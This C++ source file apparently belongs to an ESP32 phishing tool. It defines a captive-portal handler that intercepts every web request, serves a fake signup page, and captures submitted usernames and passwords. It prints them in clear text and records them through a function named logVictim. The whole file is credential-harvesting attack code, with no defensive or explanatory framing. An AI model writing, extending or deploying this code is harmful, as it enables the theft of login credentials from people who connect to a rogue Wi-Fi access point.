#include "hal/cpu_ll.h"
#include "html.h"

class CaptiveRequestHandler : public AsyncWebHandler
{
public:
    CaptiveRequestHandler() {}
    virtual ~CaptiveRequestHandler() {}

    bool canHandle(AsyncWebServerRequest *request)
    {
        return true;
    }

    void handleRequest(AsyncWebServerRequest *request)
    {

        // Handle requests to /signup
        if (request->url().equalsIgnoreCase("/signup"))
        {
            Serial.println("Got signup web req");
            request->send_P(200, "text/html", signup_html);
            return;   
        }

        String inputUsername;
        String inputPassword;

        if (request->hasParam("username"))
        {
            inputUsername = request->getParam("username")->value();
            inputPassword = request->getParam("password")->value();
            Serial.println("Got username: " + inputUsername);
            Serial.println("Got password: " + inputPassword);
            logVictim(inputUsername, inputPassword);
            request->send_P(200, "text/html", success_html);
            
        }
        else
        {
            Serial.println("Got index web req");
            {
                request->send_P(200, "text/html", index_html);
            }
        }
    }
};